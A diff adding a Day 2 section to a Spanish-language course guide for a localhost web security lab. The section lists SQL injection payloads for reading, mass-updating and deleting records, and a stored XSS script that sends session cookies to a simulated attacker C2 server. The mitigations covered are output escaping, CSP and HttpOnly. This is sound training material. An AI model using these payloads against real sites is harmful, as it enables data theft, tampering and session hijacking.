@@ -159,3 +159,38 @@ nmap -sV -p 8080,8082,3000,27017 127.0.0.1
   ```
 
 Si ambos comandos devuelven las cabeceras de Apache/PHP y el listado de puertos open (incluyendo los puertos 3000 y 27017 definidos en los contenedores), el equipo está 100% listo para realizar todos los laboratorios del curso con Google Chrome.
+
+---
+
+## 4. LABORATORIO AVANZADO DÍA 2 (OWASP A03 realista + Robo de Cookies por XSS)
+
+El Día 2 agrega un **nuevo portal de clientes vulnerable** y un **servidor atacante (C2)**, sin modificar nada de los Tracks del Día 1.
+
+### 4.1. Portal de Clientes vulnerable (SQLi de lectura, modificación y borrado)
+* **URL:** `http://localhost:8080/portal-avanzado.php` (o `http://localtest.me:8080/portal-avanzado.php`).
+* **Base de datos propia:** `/tmp/lab_avanzado.sqlite` (tablas `clientes` y `mensajes`), aislada de la del Día 1.
+* **Reiniciar datos del lab:** botón "Reiniciar datos del lab" o `?reset_av=1`.
+
+| Sección | Técnica | Payload de ejemplo | Flag |
+| :--- | :--- | :--- | :--- |
+| 1. Buscador de clientes | SQLi **lectura** (OR 1=1 / UNION) | `%' OR '1'='1` · `' UNION SELECT id,nombre,tarjeta,secreto FROM clientes-- ` | `FLAG{SQLI_LECTURA_TABLA_COMPLETA}` / `FLAG{SQLI_UNION_LECTURA_TOTAL}` |
+| 2. Ajustar saldo por ID | SQLi **modificación** (UPDATE con WHERE roto) | ID = `0 OR 1=1` | `FLAG{SQLI_UPDATE_MASIVO_WHERE_ROTO}` |
+| 3. Eliminar mensaje por ID | SQLi **borrado** (DELETE con WHERE roto) | ID = `0 OR 1=1` | `FLAG{SQLI_DELETE_MASIVO_WHERE_ROTO}` |
+| 4. Muro de soporte | **XSS almacenado** + exfiltración | ver 4.2 | `FLAG{XSS_COOKIE_ADMIN_EXFILTRADA}` |
+
+### 4.2. Servidor del Atacante / Panel C2 (la "otra base de datos" del lab)
+* **URL del panel:** `http://localhost:5000/` (se refresca cada 5s y lista todas las cookies robadas).
+* **Base de datos propia del atacante:** `/tmp/robos.sqlite` dentro del contenedor `lab_evil_collector`.
+* **Payload XSS** que se publica en el muro del portal de clientes:
+  ```html
+  <script>new Image().src="http://localhost:5000/steal.php?c="+encodeURIComponent(document.cookie)+"&u="+location.host;</script>
+  ```
+* **Flujo del ataque (demostración en clase):**
+  1. El atacante publica el payload en el muro de `portal-avanzado.php`.
+  2. La víctima (p. ej. el **administrador** con `SESION_ID=1001`, que se simula cambiando la cookie en Chrome DevTools) abre la página.
+  3. El navegador de la víctima ejecuta el script y envía su cookie al servidor atacante (puerto 5000).
+  4. En el panel C2 aparece la cookie robada y se obtiene `FLAG{XSS_COOKIE_ADMIN_EXFILTRADA}` → **session hijacking** sin conocer la contraseña.
+* **Mitigación (se ve en las diapositivas):** `htmlspecialchars()` en la salida, cabecera `Content-Security-Policy`, y cookies con `HttpOnly` para que `document.cookie` no sea legible desde JavaScript.
+
+### 4.3. Puertos del laboratorio completo
+`8080` Intranet PHP · `8082` DVWA · `3000` API Node · `27017` MongoDB · **`5000` Servidor Atacante (C2 / nuevo)**.
